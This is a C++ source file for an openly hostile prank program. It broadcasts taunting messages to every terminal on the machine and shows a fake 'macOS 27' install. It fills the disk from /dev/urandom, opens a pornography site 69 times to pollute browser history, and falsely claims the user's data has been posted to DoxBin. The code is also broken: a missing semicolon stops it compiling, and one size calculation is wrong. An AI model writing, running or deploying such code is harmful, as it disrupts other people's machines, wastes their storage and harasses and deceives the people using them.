/*

Copyright (C) 2026 Hyperion0801.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <iostream>
#include <filesystem>
#include <string>
#include <fcntl.h>
#include <unistd.h>

// Stack Overflow, this is OUR code now
unsigned short repeatLoop = 10;

void displayText(std::string msg)
{
  // for gets all things in /dev
  for (const auto e : std::filesystem::directory_iterator("/dev"))
  {
    std::string name = e.path();
    // checks if not tty then continue
    if (!(!name.rfind("tty", 0))) {
      continue;
    }
    // write msg to ttyX
    int fd = open(e.path().c_str(), O_WRONLY | O_NONBLOCK);
    write(fd, msg.c_str(), msg.size());
    close(fd);
  }
  // for gets all stuff in /dev/pts
  for (const auto e : std::filesystem::directory_iterator("/dev/pts"))
  {
    std::string name = e.path().filename().string();
    // makes sure it isn't ptmx
    if (name == "ptmx") {
      continue;
    }
    // write to pts/X
    int fd = open(e.path().c_str(), O_WRONLY | O_NONBLOCK);
    write(fd, msg.c_str(), msg.size());
    close(fd);
  }
}

// This is for the previous dev, please explain what the code does
// even if it has not been implemented yet, so that other people can fix/implement it!

void loremIpsum()
{
  const char ipsumText[439] = "Lorem ipsum dolor sit amet consectetur adipiscing elit. Quisque faucibus ex sapien vitae pellentesque sem placerat. In id cursus mi pretium tellus duis convallis. Tempus leo eu aenean sed diam urna tempor. Pulvinar vivamus fringilla lacus nec metus bibendum egestas. Iaculis massa nisl malesuada lacinia integer nunc posuere. Ut hendrerit semper vel class aptent taciti sociosqu. Ad litora torquent per conubia nostra inceptos himenaeos.";
  // sizeof calculation here is sketchy, please update!
  // ^ Who needs sizeof calculations? ipsumText is a constant and will never change. It's pretty easy to just hardcode it, and it works just fine.
  for(int i = 0; i < (sizeof(ipsumText) / sizeof(ipsumText[0] - 1)); i++)
  {
    std::cout << ipsumText[i] << std::flush;
    usleep(100000);
  }
}

void macOS()
{
  repeatLoop = 8;
  while(repeatLoop--)
  {
    // DOWNLOADING...
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1");
    usleep(666666);
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1.");
    usleep(666666);
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1..");
    usleep(666666);
    displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1...");
    usleep(666666);
  }

  // UNPACKING...
  displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1");
  usleep(666666);
  displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1.");
  usleep(666666);
  displayText("\033[2J\033[1;1HDownloading macOS 27 Beta 1..");
  usleep(200000);

  repeatLoop = 3;
  while(repeatLoop--)
  {
    // INSTALLING...
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1");
    usleep(666666);
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1.");
    usleep(666666);
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1..");
    usleep(666666);
    displayText("\033[2J\033[1;1HInstalling macOS 27 Beta 1...");
    usleep(666666);
  }
  system("cat /dev/urandom > /miku/F59FEDE0");

}

int main()
{
  sleep(3);
  displayText("lol still using this PC?");
  sleep(5);
  displayText("\nSystem Unstable!!");
  sleep(2);
  displayText("\nOh no! Kernel Panic incoming!!!");
  sleep(1);
  displayText("\n( i am lying :) )");
  sleep(3);
  displayText("\n?CP siht gnisu llits lol");
  sleep(5);
  displayText("\nFun fact about AI: ");
  sleep(2);
  displayText("it sucks ass! So I'll fire up ChatGPT now to make you suffer. :)");
  while (repeatLoop--) {
    system("xdg-open https://chatgpt.com");
  }
  sleep(5);
  displayText("Is this too little AI for you?");
  sleep(5);
  displayText("\033[2J\033[1;1H");
  loremIpsum();
  sleep(5);
  displayText("\nYo did you hear about the-\nHEADPHONE WARNING IN 5 SECONDS");
  system("mpv --no-video https://www.youtube.com/watch?v=vPlFkyXY6L0 > /dev/null");
  displayText("\nYou're a twerp for not liking Miku!\nWhat about the Kagamines?");
  system("mpv --no-video https://www.youtube.com/watch?v=KF9Mu2gXNdI > /dev/null");
  displayText("\nOkay how can I please you now?\n");
  sleep(5);
  macOS();
  sleep(10);
  displayText("\nHey I'm annoying, right? Just Ctrl+C!");
  sleep(4);
  displayText("\nDoesn't work here though. Maybe try sending SIG_KILL?");
  sleep(6)
  repeatLoop = 69;
  while(repeatLoop--) {
    system("xdg-open https://pornhub.com");
  }
  sleep(5);
  displayText("\nRIP your browser history. In case you don't have a browser, nothing ran.");
  sleep(7);
  displayText("Your data is now on DoxBin! Well, at least if you have internet.");
}
